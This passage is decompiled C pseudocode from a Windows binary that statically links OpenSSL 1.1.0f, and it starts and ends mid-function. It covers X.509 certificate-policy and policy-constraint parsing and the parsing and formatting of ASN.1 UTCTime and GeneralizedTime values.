  char **v6; // rax
  __int64 v7; // rax
  __int64 v8; // r14
  int i; // ebp
  _QWORD *v10; // rsi
  const char *v11; // rbx
  _DWORD *v12; // rax
  _BYTE *v13; // rdx
  unsigned int v14; // r8d
  _BYTE *j; // rcx
  __int64 *v17; // rcx
  __int64 v18; // rax
  __int64 v19; // rax
  _BYTE *v20; // rdx
  unsigned int v21; // r8d
  _BYTE *k; // rax
  __int64 v23; // rbx
  __int64 v24; // rax
  int *v25; // rax
  int *v26; // rdi
  int v27; // ebx
  __int64 *v28; // rax

  v5 = sub_140050B70((__int64)&unk_1401227C0);
  if ( !v5 )
    goto LABEL_12;
  v6 = sub_14002C0F0(0xA5u);
  *(_QWORD *)v5 = v6;
  if ( !v6 )
  {
    sub_140024610(34, 132, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 256);
    goto LABEL_13;
  }
  v7 = sub_140050B70((__int64)&unk_140122830);
  v8 = v7;
  if ( !v7 )
  {
LABEL_12:
    sub_140024610(34, 132, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 322);
    goto LABEL_13;
  }
  *(_QWORD *)(v5 + 8) = v7;
  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    v10 = (_QWORD *)sub_140029880((__int64)a2, i);
    v11 = (const char *)v10[1];
    if ( !strcmp(v11, "explicitText") )
    {
      v12 = sub_14004FF90();
      *(_QWORD *)(v8 + 8) = v12;
      if ( !v12 )
        goto LABEL_12;
      v13 = (_BYTE *)v10[2];
      v14 = 0;
      for ( j = v13; *j; ++v14 )
      {
        if ( v14 >= 0x80000000 )
          break;
        ++j;
      }
      if ( !(unsigned int)sub_1400475D0((__int64)v12, v13, v14 & 0x7FFFFFFF) )
        goto LABEL_12;
    }
    else if ( !strcmp(v11, "organization") )
    {
      v17 = *(__int64 **)v8;
      if ( !*(_QWORD *)v8 )
      {
        v18 = sub_140050B70((__int64)&unk_1401228A0);
        v17 = (__int64 *)v18;
        if ( !v18 )
          goto LABEL_12;
        *(_QWORD *)v8 = v18;
      }
      v19 = *v17;
      if ( a3 )
        *(_DWORD *)(v19 + 4) = 22;
      else
        *(_DWORD *)(v19 + 4) = 26;
      v20 = (_BYTE *)v10[2];
      v21 = 0;
      for ( k = v20; *k; ++v21 )
      {
        if ( v21 >= 0x80000000 )
          break;
        ++k;
      }
      if ( !(unsigned int)sub_1400475D0(*v17, v20, v21 & 0x7FFFFFFF) )
        goto LABEL_12;
    }
    else
    {
      if ( strcmp(v11, "noticeNumbers") )
      {
        sub_140024610(34, 132, 138, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 306);
        sub_140023A40(6, "section:", *v10, ",name:", v10[1], ",value:", v10[2]);
LABEL_13:
        sub_140051250((unsigned int *)v5, (__int64)&unk_1401227C0);
        return 0i64;
      }
      v23 = *(_QWORD *)v8;
      if ( !*(_QWORD *)v8 )
      {
        v24 = sub_140050B70((__int64)&unk_1401228A0);
        v23 = v24;
        if ( !v24 )
          goto LABEL_12;
        *(_QWORD *)v8 = v24;
      }
      v25 = sub_1400B8890((_BYTE *)v10[2]);
      v26 = v25;
      if ( !v25 || !(unsigned int)sub_1400296E0((unsigned int *)v25) )
      {
        sub_140024610(34, 132, 141, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 296);
        sub_140023A40(6, "section:", *v10, ",name:", v10[1], ",value:", v10[2]);
        sub_140029720(v26, (void (*)(void))sub_1400B8520);
        goto LABEL_13;
      }
      v27 = sub_1400BC110(*(int **)(v23 + 8), (unsigned int *)v26);
      sub_140029720(v26, (void (*)(void))sub_1400B8520);
      if ( !v27 )
        goto LABEL_13;
    }
  }
  v28 = *(__int64 **)v8;
  if ( *(_QWORD *)v8 && (!v28[1] || !*v28) )
  {
    sub_140024610(34, 132, 142, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 315);
    goto LABEL_13;
  }
  return v5;
}

//----- (00000001400BC110) ----------------------------------------------------
__int64 __fastcall sub_1400BC110(int *a1, unsigned int *a2)
{
  int v4; // ebx
  __int64 v5; // rax
  _DWORD *v6; // rax
  __int64 v7; // rdi

  v4 = 0;
  if ( (int)sub_1400296E0(a2) <= 0 )
    return 1i64;
  while ( 1 )
  {
    v5 = sub_140029880((__int64)a2, v4);
    v6 = sub_1400B92B0(0i64, *(char **)(v5 + 8));
    v7 = (__int64)v6;
    if ( !v6 )
      break;
    if ( !(unsigned int)sub_1400297C0(a1, (__int64)v6) )
    {
      sub_14004FD70(v7);
      sub_140024610(34, 133, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 349);
      return 0i64;
    }
    if ( ++v4 >= (int)sub_1400296E0(a2) )
      return 1i64;
  }
  sub_140024610(34, 133, 140, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 339);
  return 0i64;
}

//----- (00000001400BC1E0) ----------------------------------------------------
__int64 __fastcall sub_1400BC1E0(__int64 a1, unsigned int *a2, int a3)
{
  __int64 v6; // rsi
  int i; // ebp
  __int64 v8; // rbx
  const char *v9; // rdi
  char **v10; // rax
  __int64 v11; // rax
  _QWORD *v12; // rdi
  char **v13; // rax
  _DWORD *v14; // rax
  _BYTE *v15; // rdx
  unsigned int v16; // r8d
  _BYTE *j; // rcx
  int v18; // eax
  unsigned int *v19; // rax
  __int64 v20; // rdi
  __int64 v21; // rbx

  v6 = sub_140050B70((__int64)&unk_1401226B0);
  if ( v6 )
  {
    for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
    {
      v8 = sub_140029880((__int64)a2, i);
      v9 = *(const char **)(v8 + 8);
      if ( !strcmp(v9, "policyIdentifier") )
      {
        v10 = sub_14002C840(*(char **)(v8 + 16), 0);
        if ( !v10 )
        {
          sub_140024610(34, 131, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 177);
LABEL_29:
          sub_140023A40(6, "section:", *(_QWORD *)v8, ",name:", *(_QWORD *)(v8 + 8), ",value:", *(_QWORD *)(v8 + 16));
          goto LABEL_36;
        }
        *(_QWORD *)v6 = v10;
      }
      else
      {
        if ( sub_1400B9240(v9, "CPS") )
        {
          if ( sub_1400B9240(*(const char **)(v8 + 8), "userNotice") )
          {
            sub_140024610(34, 131, 138, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 223);
            goto LABEL_29;
          }
          if ( **(_BYTE **)(v8 + 16) != 64 )
          {
            sub_140024610(34, 131, 137, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 203);
            goto LABEL_29;
          }
          v19 = (unsigned int *)sub_1400BB7F0(a1);
          v20 = (__int64)v19;
          if ( !v19 )
          {
            sub_140024610(34, 131, 135, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 209);
            goto LABEL_29;
          }
          v21 = sub_1400BBD90(a1, v19, a3);
          sub_1400BB850(a1, v20);
          if ( !v21 )
            goto LABEL_36;
          if ( !*(_QWORD *)(v6 + 8) )
            *(_QWORD *)(v6 + 8) = sub_1400296C0();
          v18 = sub_1400297C0(*(int **)(v6 + 8), v21);
        }
        else
        {
          if ( !*(_QWORD *)(v6 + 8) )
            *(_QWORD *)(v6 + 8) = sub_1400296C0();
          v11 = sub_140050B70((__int64)&unk_1401227C0);
          v12 = (_QWORD *)v11;
          if ( !v11 || !(unsigned int)sub_1400297C0(*(int **)(v6 + 8), v11) )
            goto LABEL_35;
          v13 = sub_14002C0F0(0xA4u);
          *v12 = v13;
          if ( !v13 )
          {
            sub_140024610(34, 131, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 191);
            goto LABEL_36;
          }
          v14 = sub_14004FE30();
          v12[1] = v14;
          if ( !v14 )
            goto LABEL_35;
          v15 = *(_BYTE **)(v8 + 16);
          v16 = 0;
          for ( j = v15; *j; ++v16 )
          {
            if ( v16 >= 0x80000000 )
              break;
            ++j;
          }
          v18 = sub_1400475D0((__int64)v14, v15, v16 & 0x7FFFFFFF);
        }
        if ( !v18 )
          goto LABEL_35;
      }
    }
    if ( !*(_QWORD *)v6 )
    {
      sub_140024610(34, 131, 139, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 230);
      goto LABEL_36;
    }
    return v6;
  }
  else
  {
LABEL_35:
    sub_140024610(34, 131, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_cpols.c", 237);
LABEL_36:
    sub_140051250((unsigned int *)v6, (__int64)&unk_1401226B0);
    return 0i64;
  }
}

//----- (00000001400BC4E0) ----------------------------------------------------
_WORD *__fastcall sub_1400BC4E0(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int **v3; // r14
  int v7; // eax
  const char *v8; // rcx
  int i; // ebx
  __int64 v10; // rsi
  _WORD *result; // rax
  void *v12; // rsi

  v3 = *(unsigned int ***)a2;
  if ( *(_QWORD *)a2 )
  {
    sub_14002A590(a1, "%*sOrganization: %s\n", a3, byte_1400D7DAE, *((const char **)*v3 + 1));
    v7 = sub_1400296E0(v3[1]);
    v8 = byte_1400D7DAE;
    if ( v7 > 1 )
      v8 = (const char *)&unk_1400FB590;
    sub_14002A590(a1, "%*sNumber%s: ", a3, byte_1400D7DAE, v8);
    for ( i = 0; i < (int)sub_1400296E0(v3[1]); ++i )
    {
      v10 = sub_140029880((__int64)v3[1], i);
      if ( i )
        sub_14002A1A0(a1, (__int64)", ");
      if ( v10 )
      {
        result = sub_1400B8E70(0i64, v10);
        v12 = result;
        if ( !result )
          return result;
        sub_14002A1A0(a1, (__int64)result);
        sub_14001D930(v12);
      }
      else
      {
        sub_14002A1A0(a1, (__int64)"(null)");
      }
    }
    sub_14002A1A0(a1, (__int64)"\n");
  }
  result = *(_WORD **)(a2 + 8);
  if ( result )
    return (_WORD *)sub_14002A590(a1, "%*sExplicit Text: %s\n", a3, byte_1400D7DAE, *((_QWORD *)result + 1));
  return result;
}

//----- (00000001400BC650) ----------------------------------------------------
void *sub_1400BC650()
{
  return &unk_140122B70;
}

//----- (00000001400BC660) ----------------------------------------------------
int *__fastcall sub_1400BC660(__int64 a1, __int64 *a2, int *a3)
{
  int *v5; // [rsp+40h] [rbp+18h] BYREF

  v5 = a3;
  sub_1400B8470("Require Explicit Policy", *a2, &v5);
  sub_1400B8470("Inhibit Policy Mapping", a2[1], &v5);
  return v5;
}

//----- (00000001400BC6B0) ----------------------------------------------------
__int64 __fastcall sub_1400BC6B0(__int64 a1, __int64 a2, unsigned int *a3)
{
  __int64 v4; // rdi
  int i; // ebx
  _QWORD *v7; // rsi
  const char *v8; // rbp
  _QWORD *v9; // rdx

  v4 = sub_140050B70((__int64)&unk_140122B70);
  if ( !v4 )
  {
    sub_140024610(34, 146, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pcons.c", 64);
    return 0i64;
  }
  for ( i = 0; i < (int)sub_1400296E0(a3); ++i )
  {
    v7 = (_QWORD *)sub_140029880((__int64)a3, i);
    v8 = (const char *)v7[1];
    if ( !strcmp(v8, "requireExplicitPolicy") )
    {
      v9 = (_QWORD *)v4;
    }
    else
    {
      if ( strcmp(v8, "inhibitPolicyMapping") )
      {
        sub_140024610(34, 146, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pcons.c", 76);
        sub_140023A40(6, "section:", *v7, ",name:", v7[1], ",value:", v7[2]);
LABEL_13:
        sub_140051250((unsigned int *)v4, (__int64)&unk_140122B70);
        return 0i64;
      }
      v9 = (_QWORD *)(v4 + 8);
    }
    if ( !(unsigned int)sub_1400B8800((__int64)v7, v9) )
      goto LABEL_13;
  }
  if ( !*(_QWORD *)(v4 + 8) && !*(_QWORD *)v4 )
  {
    sub_140024610(34, 146, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pcons.c", 83);
    goto LABEL_13;
  }
  return v4;
}

//----- (00000001400BC850) ----------------------------------------------------
void __fastcall sub_1400BC850(void *a1)
{
  if ( a1 )
  {
    sub_14003F4D0(*((_QWORD *)a1 + 1));
    if ( (*(_BYTE *)a1 & 4) == 0 )
      sub_140029720(*((void **)a1 + 2), (void (*)(void))sub_1400BBD70);
    sub_140029720(*((void **)a1 + 3), (void (*)(void))sub_14003F4D0);
    sub_14001D930(a1);
  }
}

//----- (00000001400BC8B0) ----------------------------------------------------
__int64 __fastcall sub_1400BC8B0(unsigned __int8 *a1, int a2)
{
  int v2; // r8d
  unsigned __int8 *v4; // r10
  int v5; // r9d
  unsigned __int8 v6; // cl
  int v7; // edx
  char v9; // al
  __int64 result; // rax

  v2 = 0;
  v4 = a1;
  v5 = 0;
  if ( !a1 )
    return 19i64;
  v6 = *a1;
  v7 = -1;
  if ( a2 > 0 )
    v7 = a2;
  if ( !v6 )
    return 19i64;
  do
  {
    if ( !v7-- )
      break;
    v9 = v6;
    ++v4;
    if ( (unsigned int)v6 - 97 > 0x19
      && (v6 < 0x41u || v6 > 0x5Au)
      && (v6 < 0x30u || v6 > 0x39u)
      && v6 != 32
      && v6 != 39
      && v6 != 40
      && v6 != 41
      && v6 != 43
      && v6 != 44
      && v6 != 45
      && v6 != 46
      && v6 != 47
      && v6 != 58
      && v6 != 61
      && v6 != 63 )
    {
      v2 = 1;
    }
    v6 = *v4;
    if ( v9 < 0 )
      v5 = 1;
  }
  while ( v6 );
  if ( v5 )
    return 20i64;
  result = 22i64;
  if ( !v2 )
    return 19i64;
  return result;
}

//----- (00000001400BC980) ----------------------------------------------------
__int64 __fastcall sub_1400BC980(__int64 a1, __int64 a2)
{
  signed int v5; // r8d
  int v6; // ebx
  char *v7; // rdi
  __int64 v8; // rcx
  char v9; // dl
  char v10[80]; // [rsp+20h] [rbp-68h] BYREF

  if ( !a2 )
    return 0i64;
  v5 = 0;
  v6 = 0;
  v7 = *(char **)(a2 + 8);
  if ( *(int *)a2 > 0 )
  {
    v8 = 0i64;
    do
    {
      v9 = *v7;
      if ( (unsigned __int8)(*v7 - 32) <= 0x5Eu || v9 == 10 || v9 == 13 )
        v10[v8] = v9;
      else
        v10[v8] = 46;
      ++v5;
      ++v8;
      if ( v5 >= 80 )
      {
        if ( (int)sub_14002A430(a1, (__int64)v10, v5) <= 0 )
          return 0i64;
        v5 = 0;
        v8 = 0i64;
      }
      ++v6;
      ++v7;
    }
    while ( v6 < *(_DWORD *)a2 );
    if ( v5 > 0 && (int)sub_14002A430(a1, (__int64)v10, v5) <= 0 )
      return 0i64;
  }
  return 1i64;
}
// 1400BC980: using guessed type char var_68[80];

//----- (00000001400BCA70) ----------------------------------------------------
struct tm *__fastcall sub_1400BCA70(const __time64_t *a1, __int64 a2)
{
  struct tm *result; // rax

  result = gmtime64(a1);
  if ( result )
  {
    *(_OWORD *)a2 = *(_OWORD *)&result->tm_sec;
    *(_OWORD *)(a2 + 16) = *(_OWORD *)&result->tm_mon;
    *(_DWORD *)(a2 + 32) = result->tm_isdst;
    return (struct tm *)a2;
  }
  return result;
}

//----- (00000001400BCAB0) ----------------------------------------------------
__int64 __fastcall sub_1400BCAB0(int *a1, int a2, int a3)
{
  int v4; // r9d
  int v5; // r11d
  int v6; // r8d
  int v7; // r11d
  int v8; // r10d
  int v9; // r11d
  int v10; // ecx
  int v11; // r9d
  __int64 result; // rax
  int v13[6]; // [rsp+30h] [rbp-18h] BYREF
  int v14; // [rsp+68h] [rbp+20h] BYREF

  if ( !(unsigned int)sub_1400BCC60(a1, a2, a3, &v14, v13) )
    return 0i64;
  v4 = 4 * (v14 + 68569) / 146097;
  v5 = (146097 * v4 + 3) / -4 + v14 + 68569;
  v6 = 4000 * (v5 + 1) / 1461001;
  v7 = 31 - 1461 * v6 / 4 + v5;
  v8 = 80 * v7 / 2447;
  v9 = v7 - 2447 * v8 / 80;
  v10 = v8 / 11 + 100 * (v4 - 49);
  if ( (unsigned int)(v10 + v6 - 1900) > 0x1FA3 )
    return 0i64;
  v11 = v13[0];
  a1[3] = v9;
  a1[5] = v10 + v6 - 1900;
  a1[4] = v8 - 12 * (v8 / 11) + 1;
  a1[2] = v11 / 3600;
  a1[1] = v11 / 60 % 60;
  result = 1i64;
  *a1 = v11 % 60;
  return result;
}
// 1400BCAB0: using guessed type int var_18[6];

//----- (00000001400BCC60) ----------------------------------------------------
__int64 __fastcall sub_1400BCC60(_DWORD *a1, int a2, int a3, int *a4, int *a5)
{
  int v5; // r11d
  int v6; // ebx
  int v7; // eax

  v5 = a2 + a3 / 86400;
  v6 = *a1 + 60 * (a1[1] + 60 * a1[2]) + a3 % 86400;
  if ( v6 < 86400 )
  {
    if ( v6 < 0 )
    {
      --v5;
      v6 += 86400;
    }
  }
  else
  {
    ++v5;
    v6 -= 86400;
  }
  v7 = v5
     + a1[3]
     + 367 * (a1[4] + 1 - 12 * ((a1[4] - 13) / 12) - 2) / 12
     - 3 * (((a1[4] - 13) / 12 + a1[5] + 6800) / 100) / 4
     + 1461 * ((a1[4] - 13) / 12 + a1[5] + 6700) / 4
     - 32075;
  if ( v7 < 0 )
    return 0i64;
  *a4 = v7;
  *a5 = v6;
  return 1i64;
}

//----- (00000001400BCDA0) ----------------------------------------------------
_DWORD *__fastcall sub_1400BCDA0(_DWORD *a1, __time64_t a2, int a3, int a4)
{
  unsigned int v4; // edi
  _DWORD *v7; // rsi
  int v8; // ebp
  struct tm *v9; // rax
  struct tm *v10; // r14
  _BYTE *v11; // rbx
  __time64_t v13; // [rsp+50h] [rbp-78h] BYREF
  char v14[40]; // [rsp+58h] [rbp-70h] BYREF

  v4 = 0;
  v13 = a2;
  v7 = a1;
  v8 = 0;
  if ( !a1 )
  {
    v7 = sub_14004FF60();
    if ( !v7 )
      return 0i64;
    v8 = 1;
  }
  v9 = sub_1400BCA70(&v13, (__int64)v14);
  v10 = v9;
  if ( !v9
    || (a3 || a4) && !(unsigned int)sub_1400BCAB0(&v9->tm_sec, a3, a4)
    || (unsigned int)(v10->tm_year - 50) > 0x63 )
  {
LABEL_13:
    if ( v8 )
      sub_14004FD70((__int64)v7);
    return 0i64;
  }
  v11 = (_BYTE *)*((_QWORD *)v7 + 1);
  if ( !v11 || *v7 < 0x14u )
  {
    v11 = sub_14001D8E0(0x14ui64);
    if ( !v11 )
    {
      sub_140024610(13, 218, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_utctm.c", 168);
      goto LABEL_13;
    }
    sub_14001D930(*((void **)v7 + 1));
    *((_QWORD *)v7 + 1) = v11;
  }
  sub_14002A5C0(
    v11,
    0x14ui64,
    "%02d%02d%02d%02d%02d%02dZ",
    (unsigned int)(v10->tm_year % 100),
    v10->tm_mon + 1,
    v10->tm_mday,
    v10->tm_hour,
    v10->tm_min,
    v10->tm_sec);
  for ( ; *v11; ++v4 )
  {
    if ( v4 >= 0x80000000 )
      break;
    ++v11;
  }
  v7[1] = 23;
  *v7 = v4 & 0x7FFFFFFF;
  return v7;
}
// 1400BCDA0: using guessed type char var_70[40];

//----- (00000001400BCF50) ----------------------------------------------------
__int64 __fastcall sub_1400BCF50(int *a1)
{
  return sub_1400BD150(0i64, a1);
}

//----- (00000001400BCF70) ----------------------------------------------------
__int64 __fastcall sub_1400BCF70(__int64 a1, __int64 a2)
{
  int v2; // r9d
  unsigned int v3; // ebx
  char *v4; // r8
  int v6; // edi
  _BYTE *v7; // rax
  int v8; // edx
  int v9; // r11d
  unsigned int v10; // esi
  char v11; // cl
  char v12; // dl
  const char *v13; // rcx
  int v15; // [rsp+20h] [rbp-48h]
  int v16; // [rsp+28h] [rbp-40h]
  int v17; // [rsp+30h] [rbp-38h]
  int v18; // [rsp+38h] [rbp-30h]

  v2 = *(_DWORD *)a2;
  v3 = 0;
  v4 = *(char **)(a2 + 8);
  v6 = 0;
  if ( *(int *)a2 >= 10 )
  {
    v7 = *(_BYTE **)(a2 + 8);
    while ( (unsigned __int8)(*v7 - 48) <= 9u )
    {
      if ( ++v7 - v4 >= 10 )
      {
        v8 = v4[1] + 2 * (5 * *v4 - 264);
        v9 = v8 + 100;
        if ( v8 >= 50 )
          v9 = v4[1] + 2 * (5 * *v4 - 264);
        v10 = v4[3] - 529 + 10 * v4[2];
        if ( v10 <= 0xB )
        {
          if ( v2 >= 12 )
          {
            v11 = v4[10];
            if ( (unsigned __int8)(v11 - 48) <= 9u )
            {
              v12 = v4[11];
              if ( (unsigned __int8)(v12 - 48) <= 9u )
                v6 = v12 + 2 * (5 * v11 - 264);
            }
          }
          v13 = " GMT";
          if ( v4[v2 - 1] != 90 )
            v13 = byte_1400D7DAE;
          v18 = v9 + 1900;
          v17 = v6;
          v16 = v4[9] - 528 + 10 * v4[8];
          v15 = v4[7] + 2 * (5 * v4[6] - 264);
          LOBYTE(v3) = (int)sub_14002A590(
                              a1,
                              "%s %2d %02d:%02d:%02d %d%s",
                              off_14013D1D0[v10],
                              (unsigned int)(v4[5] + 10 * v4[4] - 528),
                              v15,
                              v16,
                              v17,
                              v18,
                              v13) > 0;
          return v3;
        }
        break;
      }
    }
  }
  sub_14002A430(a1, (__int64)"Bad time value", 0xEu);
  return 0i64;
}
// 14013D1D0: using guessed type char *off_14013D1D0[14];

//----- (00000001400BD150) ----------------------------------------------------
__int64 __fastcall sub_1400BD150(int *a1, int *a2)
{
  __int64 v4; // r11
  unsigned int v5; // ebp
  int v6; // ebx
  __int64 v7; // r14
  int v8; // r8d
  __int64 v9; // rdx
  __int64 v10; // r10
  __int64 v11; // r12
  unsigned __int8 v12; // al
  char v13; // al
  __int64 v14; // rdx
  int v15; // ecx
  char v16; // al
  int v17; // r9d
  int v18; // eax
  char v19; // cl
  int v20; // esi
  int v21; // r10d
  __int64 v22; // rdx
  char *v23; // r8
  char v24; // r9
  int v25; // r9d

  if ( a2[1] != 23 )
    return 0i64;
  v4 = *((_QWORD *)a2 + 1);
  v5 = 0;
  v6 = 0;
  v7 = *a2;
  if ( (int)v7 >= 11 )
  {
    v8 = 0;
    v9 = 0i64;
    v10 = 0i64;
    v11 = 0x800000000005i64;
    while ( 1 )
    {
      if ( v8 == 5 )
      {
        v12 = *(_BYTE *)(v9 + v4) - 43;
        if ( v12 <= 0x2Fu )
        {
          if ( _bittest64(&v11, (char)v12) )
            break;
        }
      }
      v13 = *(_BYTE *)(v9 + v4);
      if ( v13 < 48 )
        return 0i64;
      if ( v13 > 57 )
        return 0i64;
      v14 = v9 + 1;
      v15 = v13;
      if ( v14 > v7 )
        return 0i64;
      v16 = *(_BYTE *)(v14 + v4);
      if ( v16 < 48 )
        return 0i64;
      if ( v16 > 57 )
        return 0i64;
      v6 += 2;
      v9 = v14 + 1;
      v17 = v16 + 2 * (5 * v15 - 264);
      if ( v9 > v7 || v17 < dword_140122C78[v10] || v17 > dword_140122C98[v10] )
        return 0i64;
      if ( a1 )
      {
        switch ( v8 )
        {
          case 0:
            v18 = v17 + 100;
            if ( v17 >= 50 )
              v18 = v17;
            a1[5] = v18;
            break;
          case 1:
            a1[4] = v17 - 1;
            break;
          case 2:
            a1[3] = v17;
            break;
          case 3:
            a1[2] = v17;
            break;
          case 4:
            a1[1] = v17;
            break;
          case 5:
            *a1 = v17;
            break;
          default:
            break;
        }
      }
      ++v8;
      ++v10;
      if ( v8 >= 6 )
        goto LABEL_30;
    }
    if ( a1 )
      *a1 = 0;
LABEL_30:
    v19 = *(_BYTE *)(v6 + v4);
    if ( v19 == 90 )
    {
      LOBYTE(v5) = v6 + 1 == (_DWORD)v7;
      return v5;
    }
    if ( ((v19 - 43) & 0xFD) != 0 )
    {
LABEL_49:
      LOBYTE(v5) = v6 == (_DWORD)v7;
      return v5;
    }
    v20 = -1;
    v21 = 0;
    if ( v19 == 45 )
      v20 = 1;
    if ( ++v6 + 4 <= (int)v7 )
    {
      v22 = 6i64;
      v23 = (char *)(v4 + v6);
      while ( (unsigned __int8)(*v23 - 48) <= 9u )
      {
        v24 = v23[1];
        if ( (unsigned __int8)(v24 - 48) > 9u )
          break;
        v25 = v24 + 2 * (5 * *v23 - 264);
        if ( v25 < dword_140122C78[v22] || v25 > dword_140122C98[v22] )
          break;
        if ( a1 )
        {
          if ( v22 == 6 )
          {
            v21 = 3600 * v25;
          }
          else if ( v22 == 7 )
          {
            v21 += 60 * v25;
          }
        }
        v6 += 2;
        v23 += 2;
        if ( ++v22 >= 8 )
        {
          if ( v21 && !(unsigned int)sub_1400BCAB0(a1, 0, v20 * v21) )
            return 0i64;
          goto LABEL_49;
        }
      }
    }
  }
  return 0i64;
}
// 140122C78: using guessed type int dword_140122C78[8];
// 140122C98: using guessed type int dword_140122C98[8];

//----- (00000001400BD3F0) ----------------------------------------------------
_DWORD *__fastcall sub_1400BD3F0(_DWORD *a1, __time64_t a2, int a3, int a4)
{
  _DWORD *v7; // rdi
  struct tm *v9; // rax
  struct tm *v10; // rsi
  _BYTE *v11; // rbx
  unsigned int i; // eax
  __time64_t v13; // [rsp+50h] [rbp-68h] BYREF
  char v14[40]; // [rsp+58h] [rbp-60h] BYREF

  v13 = a2;
  if ( a1 )
    v7 = a1;
  else
    v7 = sub_14004FE00();
  if ( !v7 )
    return 0i64;
  v9 = sub_1400BCA70(&v13, (__int64)v14);
  v10 = v9;
  if ( !v9 || (a3 || a4) && !(unsigned int)sub_1400BCAB0(&v9->tm_sec, a3, a4) )
    goto LABEL_14;
  v11 = (_BYTE *)*((_QWORD *)v7 + 1);
  if ( !v11 || *v7 < 0x14u )
  {
    v11 = sub_14001D8E0(0x14ui64);
    if ( !v11 )
    {
      sub_140024610(13, 216, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_gentm.c", 196);
LABEL_14:
      if ( !a1 )
        sub_14004FD70((__int64)v7);
      return 0i64;
    }
    sub_14001D930(*((void **)v7 + 1));
    *((_QWORD *)v7 + 1) = v11;
  }
  sub_14002A5C0(
    v11,
    0x14ui64,
    "%04d%02d%02d%02d%02d%02dZ",
    (unsigned int)(v10->tm_year + 1900),
    v10->tm_mon + 1,
    v10->tm_mday,
    v10->tm_hour,
    v10->tm_min,
    v10->tm_sec);
  for ( i = 0; *v11; ++i )
  {
    if ( i >= 0x80000000 )
      break;
    ++v11;
  }
  v7[1] = 24;
  *v7 = i & 0x7FFFFFFF;
  return v7;
}
// 1400BD3F0: using guessed type char var_60[40];

//----- (00000001400BD590) ----------------------------------------------------
__int64 __fastcall sub_1400BD590(int *a1)
{
  return sub_1400BD890(0i64, a1);
}

//----- (00000001400BD5B0) ----------------------------------------------------
__int64 __fastcall sub_1400BD5B0(__int64 a1, __int64 a2)
{
  int v2; // r10d
  unsigned int v3; // ebx
  char *v4; // r8
  int v6; // esi
  const char *v7; // r11
  int v8; // r9d
  _BYTE *v9; // rcx
  unsigned int v10; // ebp
  char v11; // cl
  char v12; // dl
  int v13; // edx
  _BYTE *v14; // rcx
  const char *v15; // rax
  int v17; // [rsp+20h] [rbp-68h]
  int v18; // [rsp+28h] [rbp-60h]
  int v19; // [rsp+30h] [rbp-58h]
  int v20; // [rsp+48h] [rbp-40h]

  v2 = *(_DWORD *)a2;
  v3 = 0;
  v4 = *(char **)(a2 + 8);
  v6 = 0;
  v7 = 0i64;
  v8 = 0;
  if ( *(int *)a2 >= 12 )
  {
    v9 = *(_BYTE **)(a2 + 8);
    while ( (unsigned __int8)(*v9 - 48) <= 9u )
    {
      if ( ++v9 - v4 >= 12 )
      {
        v10 = v4[5] - 529 + 10 * v4[4];
        if ( v10 > 0xB )
          break;
        if ( v2 >= 14 )
        {
          v11 = v4[12];
          if ( (unsigned __int8)(v11 - 48) <= 9u )
          {
            v12 = v4[13];
            if ( (unsigned __int8)(v12 - 48) <= 9u )
            {
              v6 = v12 + 2 * (5 * v11 - 264);
              if ( v2 >= 15 && v4[14] == 46 )
              {
                v7 = v4 + 14;
                v8 = 1;
                if ( v2 > 15 )
                {
                  v13 = 15;
                  v14 = v4 + 15;
                  do
                  {
                    if ( (unsigned __int8)(*v14 - 48) > 9u )
                      break;
                    ++v8;
                    ++v13;
                    ++v14;
                  }
                  while ( v13 < v2 );
                }
              }
            }
          }
        }
        v15 = " GMT";
        if ( v4[v2 - 1] != 90 )
          v15 = byte_1400D7DAE;
        v20 = v4[3] - 53328 + 10 * (v4[2] + 10 * (v4[1] + 10 * *v4));
        v19 = v6;
        v18 = v4[11] - 528 + 10 * v4[10];
        v17 = v4[9] + 2 * (5 * v4[8] - 264);
        LOBYTE(v3) = (int)sub_14002A590(
                            a1,
                            "%s %2d %02d:%02d:%02d%.*s %d%s",
                            off_14013D1D0[v10],
                            (unsigned int)(v4[7] + 10 * v4[6] - 528),
                            v17,
                            v18,
                            v19,
                            v8,
                            v7,
                            v20,
                            v15) > 0;
        return v3;
      }
    }
  }
  sub_14002A430(a1, (__int64)"Bad time value", 0xEu);
  return 0i64;
}
// 14013D1D0: using guessed type char *off_14013D1D0[14];

//----- (00000001400BD7E0) ----------------------------------------------------
__int64 __fastcall sub_1400BD7E0(__int64 a1, _BYTE *a2)
{
  unsigned int v2; // ebx
  _BYTE *i; // rax
  int v6; // ebx
  int v8[2]; // [rsp+20h] [rbp-28h] BYREF
  _BYTE *v9; // [rsp+28h] [rbp-20h]

  v2 = 0;
  v8[1] = 24;
  for ( i = a2; *i; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++i;
  }
  v6 = v2 & 0x7FFFFFFF;
  v9 = a2;
  v8[0] = v6;
  if ( (unsigned int)sub_1400BD890(0i64, v8) )
  {
    if ( !a1 )
      return 1i64;
